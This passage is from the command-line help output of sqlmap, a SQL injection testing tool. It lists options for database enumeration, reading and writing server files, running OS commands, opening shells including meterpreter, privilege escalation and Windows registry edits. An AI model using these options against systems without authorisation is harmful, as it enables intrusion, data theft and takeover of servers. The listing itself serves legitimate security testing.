        --search            Search column(s), table(s) and/or database name(s)
        -D DB               DBMS database to enumerate
        -T TBL              DBMS database table to enumerate
        -C COL              DBMS database table column to enumerate
        -U USER             DBMS user to enumerate
        --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
        --start=LIMITSTART  First query output entry to retrieve
        --stop=LIMITSTOP    Last query output entry to retrieve
        --first=FIRSTCHAR   First query output word character to retrieve
        --last=LASTCHAR     Last query output word character to retrieve
        --sql-query=QUERY   SQL statement to be executed
        --sql-shell         Prompt for an interactive SQL shell
        --sql-file=SQLFILE  Execute SQL statements from given file(s)

    Brute force:
        These options can be used to run brute force checks

        --common-tables     Check existence of common tables
        --common-columns    Check existence of common columns

    User-defined function injection:
        These options can be used to create custom user-defined functions

        --udf-inject        Inject custom user-defined functions
        --shared-lib=SHLIB  Local path of the shared library

    File system access:
        These options can be used to access the back-end database management
        system underlying file system

        --file-read=RFILE   Read a file from the back-end DBMS file system
        --file-write=WFILE  Write a local file on the back-end DBMS file system
        --file-dest=DFILE   Back-end DBMS absolute filepath to write to

    Operating system access:
        These options can be used to access the back-end database management
        system underlying operating system

        --os-cmd=OSCMD      Execute an operating system command
        --os-shell          Prompt for an interactive operating system shell
        --os-pwn            Prompt for an OOB shell, meterpreter or VNC
        --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
        --os-bof            Stored procedure buffer overflow exploitation
        --priv-esc          Database process user privilege escalation
        --msf-path=MSFPATH  Local path where Metasploit Framework is installed
        --tmp-path=TMPPATH  Remote absolute path of temporary files directory

    Windows registry access:
        These options can be used to access the back-end database management
        system Windows registry

        --reg-read          Read a Windows registry key value
        --reg-add           Write a Windows registry key value data
        --reg-del           Delete a Windows registry key value
        --reg-key=REGKEY    Windows registry key
        --reg-value=REGVAL  Windows registry key value
        --reg-data=REGDATA  Windows registry key value data
        --reg-type=REGTYPE  Windows registry key value type

    General:
        These options can be used to set some general working parameters

        -s SESSIONFILE      Load session from a stored (.sqlite) file
        -t TRAFFICFILE      Log all HTTP traffic into a textual file
        --batch             Never ask for user input, use the default behaviour
        --charset=CHARSET   Force character encoding used for data retrieval
        --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
        --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
        --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
        --eta               Display for each output the estimated time of arrival
        --flush-session     Flush session files for current target
        --forms             Parse and test forms on target URL
        --fresh-queries     Ignore query results stored in session file
        --hex               Use DBMS hex function(s) for data retrieval
        --output-dir=ODIR   Custom output directory path
        --parse-errors      Parse and display DBMS error messages from responses
        --pivot-column=P..  Pivot column name
        --save              Save options to a configuration INI file
        --scope=SCOPE       Regexp to filter targets from provided proxy log
        --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
        --update            Update sqlmap

    Miscellaneous:
        -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
        --alert=ALERT       Run shell command(s) when SQL injection is found
        --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")
        --beep              Make a beep sound when SQL injection is found
        --check-waf         Heuristically check for WAF/IPS/IDS protection
        --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
        --dependencies      Check for missing (non-core) sqlmap dependencies
        --disable-coloring  Disable console output coloring
        --gpage=GOOGLEPAGE  Use Google dork results from specified page number
        --identify-waf      Make a through testing for a WAF/IPS/IDS protection
        --mobile            Imitate smartphone through HTTP User-Agent header
        --page-rank         Display page rank (PR) for Google dork results
        --purge-output      Safely remove all content from output directory
        --smart             Conduct through tests only if positive heuristic(s)
        --wizard            Simple wizard interface for beginner users

    Press Enter to continue...

    [*] shutting down at 14:09:12

